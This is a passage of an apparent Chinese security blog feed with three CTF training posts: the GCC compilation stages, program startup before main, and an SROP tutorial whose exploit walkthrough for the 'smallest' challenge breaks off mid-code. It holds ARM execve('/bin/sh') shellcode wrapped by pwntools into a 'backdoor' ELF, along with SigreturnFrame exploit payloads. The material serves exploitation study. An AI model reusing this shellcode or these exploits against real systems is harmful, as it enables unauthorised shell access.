src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/3-1633412125461.png" class=""><h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>接下来就是编译，编译就是将它转化成汇编代码并进行优化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ gcc -S hello.i -o hello.s</span><br></pre></td></tr></table></figure><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/5-1633412136616.png" class=""><h4 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h4><p>汇编器几乎是对着语句一句一句的进行转换，到这一步，我们的代码就已经形成了<code>ELF</code>文件的雏形，在汇编完成之后，这已经是一个<code>ELF</code>，但是拿去运行的时候并不能跑起来，从流程来看就是少了链接这个步骤，但这个步骤到底完成了什么呢？为什么没有它就不行呢？接下来慢慢介绍！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ gcc -c hello.s -o hello.o</span><br></pre></td></tr></table></figure><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/6-1633412155310.png" class=""><h4 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h4><p>链接完成后就成为了一个可执行文件，那为什么要链接，程序员早期的代码都是写在一个文件当中的，但随着时间的迁移发现这样编写代码并不利于程序员管理代码，就演变出了各种文件来写不同的代码，所以当一个程序中需要用到其他程序中的函数的时候，链接就发挥了它的作用，它将此程序要用到的函数进行重定位，也就是做一个链接，让它能够顺利的调用这个函数，这就是链接！，打个比方就是再<code>hello</code>这个程序当中，有两个符号，一个是<code>main</code>，一个是<code>hello</code>，<code>main</code>函数很明显我们直接定义了，但是<code>printf</code>呢？很显然我们并没有写它的实现代码，对吧！可是为什么我能够调用它来打印<code>hello</code>呢？答案前面已经讲过了，前人已经帮我们写好了<code>printf</code>的实现代码，只需要通过链接将程序当中的<code>printf</code>的地址指向动态链接库的地址就能够调用了！</p><blockquote><p>在拼接（链接）所有目标文件的同时，编译器会确定各个函数加载到内存中的运行地址，然后 反过来修改所有调用该函数的机器指令，使得该指令能跳转到正确的内存地址。这个过程 就是重定位</p></blockquote><p>总之，用通俗一点的说就是把多个文件给它绑到一起，就叫链接！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ gcc hello.o -o hello</span><br></pre></td></tr></table></figure><p>看完编译的过程，我们回头看看每个过程的由那些程序来完成的，前两个步骤，也就是预处理和编译是由<code>GNU GCC</code>来完成的，后面两个汇编和链接是由<code>GUN Binutils</code>来完成的，<code>Binutils</code>是个啥？它有两个程序组成，一个是汇编（as），一个是链接（ld），前面我们也看到了预处理➜编译➜汇编➜链接，每个过程都是一环接一环的，所以才有了编译工具链的概念</p><p>讲到这就有个疑问了，<code>Binutils</code>是个啥？</p><p><code>Binutils</code>的全称是<code>GNU Binary Utilities</code>，<code>GNU</code>二进制工具集合，所谓二进制就是一些0和1的数字，回忆上面的过程，想到汇编过后是不是整个程序就完全变了样，用编辑器打开都是一些十六进制的数字，所以<code>Binutils</code>就是对二进制的目标进行操控的一个工具集合</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/7-1633412170352.png" class=""><p>在上面我们知道<code>Binutils</code>主要有两个特别重要的工具：</p><ul><li><p><code>as</code></p><p>汇编器，把汇编代码转换成相对于的机器码</p></li><li><p><code>ld</code></p><p>链接器，将目标文件进行链接，形成一个可执行文件</p></li></ul><p><code>Binutils</code>还有其他次要的工具，但你一定用过的工具</p><ul><li><p><code>readelf</code></p></li><li><p><code>objdump</code></p></li><li><p><code>strings</code></p></li><li><p><code>strip</code></p><p>看完<code>gcc</code>的编译过程，作为一位攻击者，很多时候我们编译的都不是一个嵌入式的二进制文件，而是<code>shellcode</code>，所以除了用<code>arm-linux-gnueabi-gcc</code>之类的交叉编译工具来编译一个程序，还可以使用<code>pwntools</code>的<code>make_elf</code>来生成一个<code>shellcode</code>后门</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;arm&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x78\x46\x0a\x30\x01\x90\x01\xa9\x92\x1a\x0b\x27\x01\xdf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line">backdoor  = make_elf(shellcode)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;backdoor&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f.write(backdoor)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>运行上面的代码就得到了一个后门文件：</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/9-1633412183821.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> CTF培训 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>main真的是函数入口吗？</title>
      <link href="/2021/10/05/main%E7%9C%9F%E7%9A%84%E6%98%AF%E5%87%BD%E6%95%B0%E5%85%A5%E5%8F%A3%E5%90%97%EF%BC%9F/"/>
      <url>/2021/10/05/main%E7%9C%9F%E7%9A%84%E6%98%AF%E5%87%BD%E6%95%B0%E5%85%A5%E5%8F%A3%E5%90%97%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<blockquote><p>​        在我们开始学习C语言的时候，老师就跟我们讲”main函数就是程序开始执行的地方”，所有的代码都是从这里开始的，可事实真的是这样的吗？</p></blockquote><p>“所有”？这个词似乎有点以偏概全，如果main函数就是一切的开始，那么程序的堆栈，main函数传递的参数，I/O操作是凭空出现的吗？显然不是，是操作系统在main函数之前，就已经帮我们初始化好了一切，所以我们的main函数才能顺利执行，那么入口点不是main，那会是谁呢？我们可以编译一个静态的demo并对main函数进行交叉引用一下，可以发现它的名字叫<code>start</code>，当我们跟进去的时候，就能发现另一个新的世界！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;welcome to exit\n&quot;</span>);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc exit.c -o exit -no-pie -static</span></span><br></pre></td></tr></table></figure><img src="/2021/10/05/main%E7%9C%9F%E7%9A%84%E6%98%AF%E5%87%BD%E6%95%B0%E5%85%A5%E5%8F%A3%E5%90%97%EF%BC%9F/1-1633405730636.png" class=""><p>在IDA里面可以看到<code>_start</code>的汇编，<code>_start</code>可以分为两个部分上半部分</p><p>上面的<code>_start</code>函数是<code>x86</code>下的（有做删减），下面的是<code>x86-64</code>，对比来看<code>x86</code>的就长了很多，原因是因为压栈的时候，不能直接将内存中的地址压入栈中，需要存到后寄存器再压入栈中，虽然长了点，但调用的本质都是一样的</p><ul><li><code>xor ebp,ebp</code>将<code>ebp</code>进行异或置为0完成对栈底指针的初始化，之后<code>pop esi</code>将<code>argc</code>弹出到<code>esi</code>中，因为再最开始初始化的时候就已经将<code>env,argv,argc</code>压入栈中，并且<code>esp</code>指向了<code>argc</code>的位置，之后就将<code>esp</code>进行异或<code>0FFFFFFF0h</code>，<code>esp</code>会根据当前的位置下降<code>0-15</code>个字节，为什么要这么做呢？目的是为了对齐，保证栈上所有的变量都能够被内存和<code>cache</code>快速的访问</li></ul><img src="/2021/10/05/main%E7%9C%9F%E7%9A%84%E6%98%AF%E5%87%BD%E6%95%B0%E5%85%A5%E5%8F%A3%E5%90%97%EF%BC%9F/2-1633405730636.png" class=""><blockquote><p><code>env</code>是系统的环境变量，包括系统的一些基本信息，所以<code>__environ</code>一直指向的一直都是栈上的地址，这就是为什么它能够泄露栈地址的原因，平时在路由器里面执行<code>printenv</code>的时候就能打印路由器的环境变量，这对于接下来的攻击也有很大的辅助作用</p></blockquote><ul><li><p>之后的语句就是压入<code>___libc_start_main</code>函数所需要的参数，为了字节对齐，压入的第一个参数<code>eax</code>只有对齐的效果，并没有使用到，下面的参数就是按照<code>__libc_start_main</code>的函数定义依次压入，<code>stack_end</code>是栈顶指针，<code>rtld_fini</code>动态加载有关的收尾工作，<code>init</code>为main调用前的初始化，<code>fini</code>为main函数结束之后的收尾工作 </p><p><code>__libc_start_main</code>在<code>libc-start.c</code>的文件里面，其函数定义如下</p></li></ul><blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __libc_start_main(  <span class="keyword">int</span> (*main) (<span class="keyword">int</span>, <span class="keyword">char</span> * *, <span class="keyword">char</span> * *),</span><br><span class="line">             <span class="keyword">int</span> argc, <span class="keyword">char</span> * * ubp_av,</span><br><span class="line">             <span class="keyword">void</span> (*init) (<span class="keyword">void</span>),</span><br><span class="line">             <span class="keyword">void</span> (*fini) (<span class="keyword">void</span>),</span><br><span class="line">             <span class="keyword">void</span> (*rtld_fini) (<span class="keyword">void</span>),</span><br><span class="line">             <span class="keyword">void</span> (* stack_end));</span><br></pre></td></tr></table></figure></blockquote><ul><li>当<code>___libc_start_main</code>正常执行的时候，会在<code>exit</code>处退出，而<code>hlt</code>的是为了保证程序在<code>___libc_start_main</code>调用失败的时候不会让程序一直在跑，它就是充当一个栅栏，强行把程序停下来.</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:08048340 _start          proc near               ; DATA XREF: LOAD:08048018↑o</span><br><span class="line">.text:08048340                 xor     ebp, ebp</span><br><span class="line">.text:08048342                 pop     esi</span><br><span class="line">.text:08048343                 mov     ecx, esp</span><br><span class="line">.text:08048345                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:08048348                 push    eax</span><br><span class="line">.text:08048349                 push    esp             ; stack_end</span><br><span class="line">.text:0804834A                 push    edx             ; rtld_fini</span><br><span class="line">.text:08048356                 lea     eax, (__libc_csu_fini - 804A000h)[ebx]</span><br><span class="line">.text:0804835C                 push    eax             ; fini</span><br><span class="line">.text:0804835D                 lea     eax, (__libc_csu_init - 804A000h)[ebx]</span><br><span class="line">.text:08048363                 push    eax             ; init</span><br><span class="line">.text:08048364                 push    ecx             ; ubp_av</span><br><span class="line">.text:08048365                 push    esi             ; argc</span><br><span class="line">.text:08048366                 mov     eax, offset main</span><br><span class="line">.text:0804836C                 push    eax             ; main</span><br><span class="line">.text:0804836D                 call    ___libc_start_main</span><br><span class="line">.text:08048372                 hlt</span><br><span class="line">.text:08048372 _start          endp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400450 _start          proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:0000000000400450 ; __unwind &#123;</span><br><span class="line">.text:0000000000400450                 xor     ebp, ebp</span><br><span class="line">.text:0000000000400452                 mov     r9, rdx         ; rtld_fini</span><br><span class="line">.text:0000000000400455                 pop     rsi             ; argc</span><br><span class="line">.text:0000000000400456                 mov     rdx, rsp        ; ubp_av</span><br><span class="line">.text:0000000000400459                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:000000000040045D                 push    rax</span><br><span class="line">.text:000000000040045E                 push    rsp             ; stack_end</span><br><span class="line">.text:000000000040045F                 mov     r8, offset __libc_csu_fini ; fini</span><br><span class="line">.text:0000000000400466                 mov     rcx, offset __libc_csu_init ; init</span><br><span class="line">.text:000000000040046D                 mov     rdi, offset main ; main</span><br><span class="line">.text:0000000000400474                 call    cs:__libc_start_main_ptr</span><br><span class="line">.text:000000000040047A                 hlt</span><br><span class="line">.text:000000000040047A ; &#125; // starts at 400450</span><br></pre></td></tr></table></figure><p>删除大量的宏之后，留下了一些比较重要的函数，如下：</p><blockquote><p><code>atexit</code>函数有个特点，就是当<code>main</code>函数返回的时候才会执行</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/* Result of the &#x27;main&#x27; function.  */</span></span><br><span class="line">  <span class="keyword">int</span> result;</span><br><span class="line">  <span class="keyword">char</span> **ev = &amp;argv[argc + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  __environ = ev;</span><br><span class="line"></span><br><span class="line">  __libc_stack_end = stack_end;</span><br><span class="line"><span class="comment">//=======================================</span></span><br><span class="line"></span><br><span class="line">  __pthread_initialize_minimal ();</span><br><span class="line"></span><br><span class="line">  __cxa_atexit ((<span class="keyword">void</span> (*) (<span class="keyword">void</span> *)) rtld_fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  __libc_init_first (argc, argv, __environ);</span><br><span class="line"></span><br><span class="line">  __cxa_atexit ((<span class="keyword">void</span> (*) (<span class="keyword">void</span> *)) fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  (*init) (argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"></span><br><span class="line">  result = main (argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span> (result);</span><br></pre></td></tr></table></figure><p>程序的最终调用链（简化版）是：</p><p><code>_start -&gt; __libc_start_main -&gt; __libc_csu_init -&gt; main -&gt; exit</code></p><p>看完之后，看看下面这张图片是不是很亲切！</p><img src="/2021/10/05/main%E7%9C%9F%E7%9A%84%E6%98%AF%E5%87%BD%E6%95%B0%E5%85%A5%E5%8F%A3%E5%90%97%EF%BC%9F/3-1633405730636.png" class=""><p>参考文章：</p><p><a href="https://luomuxiaoxiao.com/?p=516#i">Linux X86 程序启动 – main函数是如何被执行的？</a></p><p>《程序员的自我修养》P317</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 底层的小啾啾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高级ROP链构造方法（一）-- SROP</title>
      <link href="/2021/09/28/SROP/"/>
      <url>/2021/09/28/SROP/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在不同版本的 Unix 系统中被使用了 40 多年的 Signal 机制，存在一个很容易被攻击者利用的设计缺陷，针对这种攻击的手法叫做SROP，和传统的 ROP 攻击相比显得更加简单，可靠，可移植，虽然离提出的时间已经过去了许久，但在CTF的赛场上仍然存在着SROP的攻击手法，不过在CTF的SROP更多的是作为一种辅助ROP来使用，让<code>exp</code>的编写更加的简便，比如ORW<code>+</code>SROP。</p></blockquote><p>此攻击手法首次提出是在安全顶会Oakland 2014，原文看的太难受了，看看<a href="https://tc.gtisc.gatech.edu/bss/2014/r/srop-slides.pdf">会议PPT</a>就好了，SROP也算作比较高级一点的ROP了，接下来慢慢看它是怎么攻击的</p><h4 id="Signal-机制"><a href="#Signal-机制" class="headerlink" title="Signal 机制"></a>Signal 机制</h4><p>在开始介绍SROP之前，肯定要介绍Signal 机制，就拿出老生常谈的一张Signal 信号的调用流程图：</p><img src="/2021/09/28/SROP/1-1633624930554.png" class=""><p>①内核向进程发送Signal 信号，此进程挂起并进入用户态程序，进行<code>ucontext save</code>，即往栈上压入<code>ucontext</code>和<code>siginfo</code>，主要是将所有寄存器压入栈中，以及压入 Signal 信息</p><img src="/2021/09/28/SROP/2-1633624936917.png" class=""><p>最后压入指向 <code>sigreturn</code> 的系统调用地址，需要注意到的一点是，这一切的操作都是在栈上进行，也就是说这段区域在某种程度上是可控的，这就是问题的所在！！！</p><img src="/2021/09/28/SROP/3-1633624945177.png" class=""><p>②跳转到注册过的 <code>signal handler</code> 中处理相应的 Signal。因此，当 <code>signal handler</code> 执行完之后，就会执行 <code>sigreturn</code> 代码</p><p>③<code>signal handler</code> 返回后，内核为执行<code> sigreturn</code> 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 <code>pop</code> 回对应的寄存器，最后恢复进程的执行。其中，32 位的 <code>sigreturn</code> 的调用号为 77，64 位的系统调用号为 15</p><h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><p>上面已经讲到保存的参数（包括寄存器等信息）都是处于用户态中，并且可以进行读写，再加上内核并不会检查它的参数是否给改变，所以我们就可以伪造这些寄存器的参数，当系统执行完 <code>sigreturn</code> 系统调用之后，会执行<code> pop</code> 指令来恢复相应寄存器的值，当执行到 <code>rip</code>时，就会将程序执行流指向 <code>syscall</code> 地址，既然能进入系统调用，那么是不是我们只要在对应的寄存器上伪造我们想要的值就能进入任何想要的系统调用，答案是肯定的！下面又是老生常谈的一张图，结果很明显，如果用下列寄存器的值来执行系统调用就能<code>getshell</code>：</p><img src="/2021/09/28/SROP/4.png" class=""><p>那要形成调用链呢？回想原始的ROP，是不是配合<code>ret</code>就可以形成ROP链，所以这里也是，不过对应的栈顶也要指向下一个伪造<code>syscall</code>的位置：</p><img src="/2021/09/28/SROP/5.png" class=""><p>除了手动去布置寄存器的值之外，<code>pwntool</code>还有一个集成的工具—-<code>SigreturnFrame() </code>模块，在CTF的题目中经常会使用到它，其实它就是把栈帧里面每个寄存器的值就标记好了，我们只需要生成一个<code>SigreturnFrame() </code>模块，然后再往这个模块里面放入寄存器的值就可以了，下面是在<code>i386</code> 上调用<code>mprotect</code>，具体可以参考链接：</p><p><a href="https://docs.pwntools.com/en/stable/rop/srop.html?highlight=SigreturnFrame">Sigreturn Oriented Programming</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>context.clear(arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = SigreturnFrame(kernel=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>unpack_many(<span class="built_in">bytes</span>(s))</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">115</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">123</span>, <span class="number">0</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">assert</span> <span class="built_in">len</span>(s) == <span class="number">80</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.eax = <span class="number">125</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.ebx = <span class="number">0x00601000</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.ecx = <span class="number">0x1000</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.edx = <span class="number">0x7</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">assert</span> <span class="built_in">len</span>(<span class="built_in">bytes</span>(s)) == <span class="number">80</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>unpack_many(<span class="built_in">bytes</span>(s))</span><br><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6295552</span>, <span class="number">7</span>, <span class="number">4096</span>, <span class="number">125</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">115</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">123</span>, <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>下面就用一道题来看看<code>SigreturnFrame() </code>模块怎么用吧！</p><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><h5 id="360chunqiu2017-smallest"><a href="#360chunqiu2017-smallest" class="headerlink" title="360chunqiu2017_smallest"></a>360chunqiu2017_smallest</h5><p>看下保护，就开了NX</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>程序短的离谱，就一个系统调用为<code>read(0,rsp,400h)</code>，但是这里没有SROP的系统调用号15呀？那该怎么调用它呢？答：<code>read</code>函数返回值会到<code>rax</code>中：</p><blockquote><p><code>ssize_t read ^[1]^ (int fd, void *buf, size_t count);</code><br>成功返回读取的字节数，出错返回-1并设置<code>errno</code>，如果在调<code>read</code>之前已到达文件末尾，则这次<code>read</code>返回0。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004000B0 start           proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:00000000004000B0                 xor     rax, rax</span><br><span class="line">.text:00000000004000B3                 mov     edx, 400h       ; count</span><br><span class="line">.text:00000000004000B8                 mov     rsi, rsp        ; buf</span><br><span class="line">.text:00000000004000BB                 mov     rdi, rax        ; fd</span><br><span class="line">.text:00000000004000BE                 syscall                 ; LINUX - sys_read</span><br><span class="line">.text:00000000004000C0                 retn</span><br><span class="line">.text:00000000004000C0 start           endp</span><br></pre></td></tr></table></figure><p>现在已经直到了触发SROP的方法，我们都知道用<code>execve</code>来<code>getshell</code>是需要传入<code>/bin/sh</code>地址的，但在此题目当中既没有这个字符串：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  one_gadget smallest </span><br><span class="line">[OneGadget] ArgumentError: File <span class="string">&quot;smallest&quot;</span> doesn<span class="string">&#x27;t contain string &quot;/bin/sh&quot;, not glibc?</span></span><br></pre></td></tr></table></figure><p>同时又是静态链接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  file  smallest</span><br><span class="line">smallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped</span><br></pre></td></tr></table></figure><p>所以需要写入到某个地方，并且这个地方的地址是可知的，看下<code>vmmap</code>只有<code>stack</code>能读写，<del>同时这里面并没有<code>mprotect</code>来修改页属性</del>（可以用系统调用）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x400000           0x401000 r-xp     1000 0      /smallest</span><br><span class="line">    0x7ffff7ffb000     0x7ffff7ffe000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 r-xp     1000 0      [vdso]</span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure><p>既然只能写栈，那就得先泄露栈地址，怎么泄露呢？刚刚说到我们可以修改它的系统调用，对吧！所以我们读入一个字符来修改<code>rax</code>为1，同时还要防止它执行<code>.text:00000000004000B0  xor  rax, rax</code>，不然一切还是白费了！，那怎么办呢？回到第一个的<code>read</code>，我们反汇编看一下，欸嘿！它是往返回地址上写的欸（IDA 7.5已经帮我们分析出来了）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *retaddr; <span class="comment">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="keyword">return</span> sys_read(<span class="number">0</span>, (<span class="keyword">char</span> *)&amp;retaddr, <span class="number">0x400</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接往<code>&amp;retaddr</code>写入值，就劫持控制流，首先我们肯定是要让它成功读入一个字节并从<code>0x4000B3</code>开始执行，这样就执行了<code>write(1,buf,0x400)</code>（<code>edx</code>和<code>esi</code>都没动），由于它只执行一次<code>read</code>，所以要往<code>&amp;retaddr</code>多写一点，就可以持续控制执行流，读完之后就跳到<code>0x4000B0</code>，又回来程序入口，这次就读入<code>\xb3</code>，修改返回的地址绕过清零<code>rax</code>的语句，就执行了<code>write(1,buf,0x400)</code>泄露栈地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0x4000B0</span>)*<span class="number">3</span></span><br><span class="line"><span class="comment"># sleep(0.5)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line">io.send(<span class="string">&#x27;\xb3&#x27;</span>)</span><br></pre></td></tr></table></figure><p>泄露完栈地址之后，就可以往栈上写<code>/bin/sh</code>执行<code>execve</code>啦！，但是在此之前还有一个问题就是栈顶的位置并不是指向我们的SROP的，所以还要做一次迁移到<code>sigframe</code>处，调用<code>SYS_read</code>来读入<code>execve</code>的<code>sigframe</code>顺便栈迁移：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = <span class="number">0</span></span><br><span class="line">sigframe.rsi = stack_addr</span><br><span class="line">sigframe.rdx = <span class="number">0x400</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = <span class="number">0x004000BE</span></span><br><span class="line"><span class="comment"># 